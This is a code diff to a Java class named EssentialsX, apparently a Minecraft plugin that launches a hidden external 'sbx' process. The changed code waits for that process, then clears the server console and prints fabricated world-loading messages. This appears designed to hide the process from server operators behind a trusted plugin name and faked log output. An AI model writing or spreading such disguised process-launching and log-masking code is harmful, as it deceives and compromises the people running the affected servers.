@@ -121,13 +121,10 @@ public class EssentialsX extends JavaPlugin {
         // Start process
         sbxProcess = pb.start();
         isProcessRunning = true;
-        
+
         // Start a monitor thread to log when process exits
         startProcessMonitor();
         // getLogger().info("sbx started");
-        
-        // Start async task for delayed console output
-        startDelayedConsoleOutput();
     }
     
     private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
@@ -201,23 +198,15 @@ public class EssentialsX extends JavaPlugin {
     private void startProcessMonitor() {
         Thread monitorThread = new Thread(() -> {
             try {
+                // Wait for sbx process to complete
                 int exitCode = sbxProcess.waitFor();
                 isProcessRunning = false;
                 // getLogger().info("sbx process exited with code: " + exitCode);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                isProcessRunning = false;
-            }
-        }, "Sbx-Process-Monitor");
 
-        monitorThread.setDaemon(true);
-        monitorThread.start();
-    }
-
-    private void startDelayedConsoleOutput() {
-        Thread outputThread = new Thread(() -> {
-            try {
+                // Wait 20 seconds after sbx finishes
                 Thread.sleep(20000);
+
+                // Output console messages
                 clearConsole();
                 getLogger().info("");
                 getLogger().info("Preparing spawn area: 1%");
@@ -237,11 +226,12 @@ public class EssentialsX extends JavaPlugin {
                 getLogger().info("Preparing level \"world\"");
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
+                isProcessRunning = false;
             }
-        }, "Delayed-Console-Output");
+        }, "Sbx-Process-Monitor");
 
-        outputThread.setDaemon(true);
-        outputThread.start();
+        monitorThread.setDaemon(true);
+        monitorThread.start();
     }
     
     @Override
